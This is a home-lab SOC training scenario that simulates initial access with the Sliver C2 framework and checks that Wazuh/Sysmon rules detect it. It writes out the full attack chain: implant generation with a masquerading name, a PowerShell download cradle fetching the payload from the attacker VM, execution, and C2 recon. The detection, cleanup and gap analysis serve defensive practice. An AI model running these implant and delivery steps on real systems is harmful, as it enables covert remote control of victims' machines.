# Scenario 01: Initial Access via Sliver C2 Implant

> **FOR AUTHORIZED HOME LAB USE ONLY**
> This scenario runs exclusively within the isolated UTM lab (192.168.64.0/24).

---

## Scenario Overview

| Field | Value |
|-------|-------|
| **Objective** | Establish a C2 beacon from the victim to the attacker, simulating post-phishing initial access |
| **Threat Actor Profile** | APT-style operator using off-the-shelf C2 framework |
| **Duration** | ~30 minutes |
| **Complexity** | Beginner |
| **MITRE Techniques** | T1071.001, T1059.001, T1036.005 |
| **Rules Exercised** | 100006, 100009, 100010 |

---

## MITRE ATT&CK Coverage

| Phase | Technique | Sub-technique | Description |
|-------|-----------|---------------|-------------|
| Initial Access | T1566.001 | Spearphishing Attachment | Simulated — victim "opens" the implant |
| Execution | T1059.001 | PowerShell | Download cradle runs powershell.exe |
| C&C | T1071.001 | Web Protocols | Sliver mTLS/HTTPS beacon to 192.168.64.30:443 |
| C&C | T1132.001 | Standard Encoding | Sliver uses protobuf/gRPC encoding |
| Defense Evasion | T1036.005 | Match Legitimate Name | Implant renamed to mimic a legitimate utility |

---

## Prerequisites

- [ ] kali-attacker VM running (192.168.64.30) with Sliver installed
- [ ] victim-windows VM running (192.168.64.20), Sysmon active, Filebeat active
- [ ] wazuh-manager VM running (192.168.64.10), Kibana accessible at :5601
- [ ] UTM **snapshot** taken on all VMs before starting
- [ ] SSH key auth working: `ssh -i ~/.ssh/soc-lab attacker@192.168.64.30`

---

## Step-by-Step Execution

### Phase 1: Operator Setup on Kali

```bash
# [macOS host] SSH to kali-attacker
ssh -i ~/.ssh/soc-lab attacker@192.168.64.30

# [kali-attacker] Verify Sliver is installed
which sliver-server
sliver-server version
```

```bash
# [kali-attacker] Start Sliver daemon
sudo systemctl start sliver
sudo systemctl status sliver   # Should show: Active (running)

# Connect the operator console
sliver
```

```bash
# [kali — sliver console] Start HTTPS listener on lab NIC
sliver > https --lport 443 --lhost 192.168.64.30

# Verify listener is up and bound to lab IP only
sliver > jobs
# Expected: HTTPS listener on 192.168.64.30:443
```

**Safety check from macOS host (separate terminal):**

```bash
ssh -i ~/.ssh/soc-lab attacker@192.168.64.30 "ss -tlnp | grep 443"
# Must show: 192.168.64.30:443  ← CORRECT
# If 0.0.0.0:443, STOP — investigate before continuing
```

### Phase 2: Generate Windows ARM64 Implant

```bash
# [kali — sliver console] Generate implant
sliver > generate \
  --https 192.168.64.30 \
  --os windows \
  --arch arm64 \
  --format exe \
  --save /tmp/ \
  --name svchost_helper

# Sliver will produce a binary like: /tmp/SVCHOST_HELPER_XXXXXXXX.exe
# The name "svchost_helper" is chosen to resemble a legitimate Windows service name
# (a T1036.005 masquerading technique)
```

### Phase 3: Implant Delivery (Simulated Phishing)

```bash
# [kali-attacker] Serve the implant via HTTP
IMPLANT=$(ls /tmp/SVCHOST_HELPER_*.exe | head -1)
echo "Serving: $IMPLANT"
cd /tmp && python3 -m http.server 8080 --bind 192.168.64.30
```

```powershell
# [victim-windows — PowerShell as SOCAdmin]
# Simulates a user clicking a phishing link and downloading the "document.exe"

$c2 = "192.168.64.30"
$implantName = "svchost_helper.exe"   # rename for realism

# Download to AppData (writable path — exactly what our rules monitor)
$dest = "$env:APPDATA\Microsoft\Windows\Themes\$implantName"
New-Item -ItemType Directory -Path (Split-Path $dest) -Force | Out-Null
Invoke-WebRequest -Uri "http://${c2}:8080/SVCHOST_HELPER_XXXXXXXX.exe" -OutFile $dest

Write-Host "[*] Implant staged at: $dest"
```

### Phase 4: Execute the Implant (Simulate User Double-Click)

```powershell
# [victim-windows] Launch the implant
# This triggers:
#   - Sysmon EID 1 (ProcessCreate from AppData path)
#   - Sysmon EID 3 (NetworkConnect to 192.168.64.30:443)
Start-Process $dest
Write-Host "[*] Implant launched — waiting for beacon..."
```

**Note the exact UTC time:**

```powershell
Write-Host "Beacon execution time: $([System.DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ssZ'))"
```

### Phase 5: Verify C2 Session on Kali

```bash
# [kali — sliver console]
sliver > sessions

# Expected output (within 10-30 seconds):
# ID  Name           Transport  Remote Address         Username    OS/Arch
# 1   SVCHOST_HELP   https      192.168.64.20:XXXXX    SOCAdmin    windows/arm64

# Interact with the session
sliver > use 1
```

### Phase 6: Basic C2 Recon

```bash
# [kali — sliver session] Run reconnaissance (all commands generate Sysmon events)
sliver (SVCHOST_HELP) > whoami
sliver (SVCHOST_HELP) > getuid
sliver (SVCHOST_HELP) > info

sliver (SVCHOST_HELP) > pwd
sliver (SVCHOST_HELP) > ls C:\\Users\\SOCAdmin\\Desktop

sliver (SVCHOST_HELP) > netstat
# Look for: established connection to 192.168.64.30:443

sliver (SVCHOST_HELP) > ps
# Look for: svchost_helper.exe or whatever the beacon named itself
```

---

## Expected Wazuh Detections

Check Kibana at `http://192.168.64.10:5601` with the Kibana Discover view.

**Query:**
```
agent.name:"victim-windows" AND rule.id:(100006 OR 100009 OR 100010)
```

| Alert | Rule ID | Level | When | Field Evidence |
|-------|---------|-------|------|---------------|
| PowerShell download cradle (Invoke-WebRequest) | 100006 | 6 | Phase 3 | `win.eventdata.image:*powershell*` |
| C2 beacon process start from AppData | 100006 | 6 | Phase 4 | `win.eventdata.image:*AppData*` |
| First outbound connection from implant | 100009 | 6 | Phase 4 | `win.eventdata.destinationPort:443` |
| Beaconing threshold (10+ connections) | 100010 | 12 | Phase 5+ | `win.eventdata.destinationIp:192.168.64.30` |

---

## Evidence to Capture

- [ ] Screenshot of `sliver > sessions` showing active session
- [ ] Kibana screenshot showing rules 100009/100010 firing with timestamps
- [ ] Export alert JSON: `curl http://192.168.64.10:9200/wazuh-alerts-*/_search?q=rule.id:100010`
- [ ] Sysmon event raw export from Kibana (EID 3 fields: Image, DestinationIp, DestinationPort)
- [ ] Network diagram annotated with C2 flow (for incident report)

---

## Cleanup

```bash
# [kali — sliver session] Kill the implant
sliver (SVCHOST_HELP) > terminate --force

# Stop the listener
sliver > jobs kill 1

# Stop Sliver daemon
sudo systemctl stop sliver
```

```powershell
# [victim-windows] Remove implant binary
$dest = "$env:APPDATA\Microsoft\Windows\Themes\svchost_helper.exe"
Remove-Item $dest -Force -ErrorAction SilentlyContinue
Write-Host "Implant removed: $((Test-Path $dest) ? 'STILL EXISTS' : 'OK')"
```

```bash
# [kali] Remove generated implant files
rm -f /tmp/SVCHOST_HELPER_*.exe
```

**Restore VM snapshot (recommended):** UTM → right-click victim-windows → Restore Snapshot.

---

## Lessons Learned

**For the interview narrative:**
- This scenario demonstrates the initial foothold phase of the kill chain
- The key IOC is an executable spawning network connections from a user-writable path (AppData) — this is exactly what rule 100009/100010 detect
- In production, EDR tools would also catch this via behavior monitoring; Sysmon + Wazuh is the open-source equivalent
- The 30-second detection window (Sysmon → Kibana) demonstrates realistic SIEM latency constraints

**Detection gaps identified:**
- Rule 100009 requires the binary to be in a writable path — an attacker who installs to `C:\Program Files\` would not trigger the path filter (needs rule hardening)
- DNS beaconing (Sliver DNS C2 mode) is not yet covered — add to Phase 7 improvements
